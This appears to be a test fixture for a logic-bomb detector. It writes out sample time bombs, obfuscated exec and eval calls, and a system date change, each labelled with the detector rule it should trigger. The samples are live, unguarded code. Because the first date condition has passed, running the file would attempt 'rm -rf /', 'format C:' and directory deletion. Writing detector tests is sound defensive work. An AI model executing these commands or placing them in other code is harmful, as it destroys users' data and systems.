# test_malicious.py - Comprehensive test file for logic bomb detection
import datetime
import os
import shutil
import subprocess

# Pattern 1: Time-based condition (should trigger TIME_BASED_CONDITION)
if datetime.datetime.now() > datetime.datetime(2024, 12, 31):
    print("Time bomb activated!")
    
    # Pattern 2: Destructive operation in conditional (should trigger CONDITIONAL_DESTRUCTIVE_OPERATION)
    shutil.rmtree('/important_data')
    os.system('format C:')
    subprocess.call(['rm', '-rf', '/'])

# Pattern 3: Hardcoded date (should trigger HARDCODED_DATE)
trigger_date = datetime.datetime(2025, 1, 1)
target_date = "2024-12-31"
another_date = "01/01/2025"

# Pattern 4: Code obfuscation (should trigger CODE_OBFUSCATION)
exec("print('This is hidden malicious code')")
eval("__import__('os').system('whoami')")
hidden_func = __import__('subprocess')

# Pattern 5: Another time condition with different format
if datetime.date.today() >= datetime.date(2025, 1, 1):
    os.remove('/critical_file.txt')

# Pattern 6: More obfuscation
import base64
decoded = base64.b64decode(b'cHJpbnQoImhpZGRlbiIp')
exec(decoded)

# Pattern 7: System date manipulation (should trigger SYSTEM_DATE_MANIPULATION) 
os.system('date -s "2025-01-01"')

print("This file should trigger multiple logic bomb patterns!")